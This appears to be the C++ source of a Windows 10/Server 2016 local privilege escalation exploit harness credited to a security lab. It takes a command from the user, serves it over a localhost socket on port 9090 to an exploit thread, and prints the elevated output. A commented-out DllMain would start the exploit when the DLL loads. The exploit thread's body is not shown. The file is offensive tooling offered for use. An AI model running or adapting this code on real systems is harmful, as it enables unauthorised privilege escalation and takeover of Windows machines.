// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"
#include <WinSock2.h>
#include <Windows.h>
#pragma comment(lib, "ws2_32.lib")

DWORD __stdcall TransferThread(LPVOID lpParam)
{
	SOCKET bind_sock = INVALID_SOCKET;
	SOCKET accept_sock = INVALID_SOCKET;
	int send_len = 0;
	int recv_len = 0;
	int accept_addr_len = 0;
	TCHAR* recv_buf = NULL;
	sockaddr_in bind_addr = { 0 };
	sockaddr_in accept_addr = { 0 };
	TCHAR* user_cmd = (TCHAR*)lpParam;

	WORD wVersionRequested;
	WSADATA wsaData;
	int err;

	wVersionRequested = MAKEWORD(2, 2);
	err = WSAStartup(wVersionRequested, &wsaData);
	if (err != 0)
	{
		goto EXIT;
	}

	bind_sock = socket(AF_INET, SOCK_STREAM, 0);
	if (bind_sock == INVALID_SOCKET)
	{
		OutputDebugString(_TEXT("socket Fail!!!"));
		goto EXIT;
	}

	bind_addr.sin_family = AF_INET;
	bind_addr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");// INADDR_ANY;
	bind_addr.sin_port = htons(9090);

	if (bind(bind_sock, (sockaddr*)&bind_addr, sizeof(sockaddr_in)) != NULL)
	{
		OutputDebugString(_TEXT("bind Fail!!!"));
		goto EXIT;
	}

	if (listen(bind_sock, 1) != NULL)
	{
		OutputDebugString(_TEXT("listen Fail!!!"));
		goto EXIT;
	}

	while (true)
	{
		accept_addr_len = sizeof(sockaddr_in);
		accept_sock = accept(bind_sock, (sockaddr*)&accept_addr, &accept_addr_len);

		send_len = wcslen(user_cmd) * 2 + 2;
		send(accept_sock, (char*)&send_len, sizeof(send_len), 0);
		send(accept_sock, (char*)user_cmd, send_len, 0);

		recv(accept_sock, (char*)&recv_len, sizeof(recv_len), 0);
		recv_buf = (TCHAR*)new char[recv_len];

		if (recv_buf != NULL)
		{
			recv(accept_sock, (char*)recv_buf, recv_len, 0);
			printf((char*)recv_buf);
		}

		closesocket(accept_sock);
		break;
	}


EXIT:
	if (bind_sock != INVALID_SOCKET)
	{
		closesocket(bind_sock);
	}

	WSACleanup();

	OutputDebugString(_TEXT("exit !!!"));
	return 0;
}

DWORD CALLBACK ExploitThread(LPVOID hModule);

int _tmain(int argc, TCHAR* argv[])
{
	HANDLE transfer_thread = NULL;
	HANDLE exp_thread = NULL;
	TCHAR* command_buffer = NULL;

	if (argc < 2)
	{
		wprintf(_TEXT("Usage: Win2016LPE \"command\"\r\n"));
		return 0;
	}
	
	command_buffer = (TCHAR*) new char[wcslen(argv[1]) *2 + 2];
	if (command_buffer == NULL)
	{
		wprintf(_TEXT("command too long\r\n"));
		return 0;
	}
	wcscpy_s(command_buffer, wcslen(argv[1]) * 2 + 2, argv[1]);

	wprintf(_TEXT("Win10&Win2016 LPE by @Topsec_Alpha_lab(https://github.com/alpha1ab)\r\n"));

	transfer_thread = CreateThread(NULL, NULL, TransferThread, (LPVOID)command_buffer, NULL, NULL);
	Sleep(1000);
	exp_thread = CreateThread(NULL, 0, ExploitThread, NULL, 0, NULL);

	WaitForSingleObject(transfer_thread, INFINITE);
	WaitForSingleObject(exp_thread, INFINITE);
	return 0;
}


/*
BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		CreateThread(NULL, 0, ExploitThread, hModule, 0, NULL);
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
*/
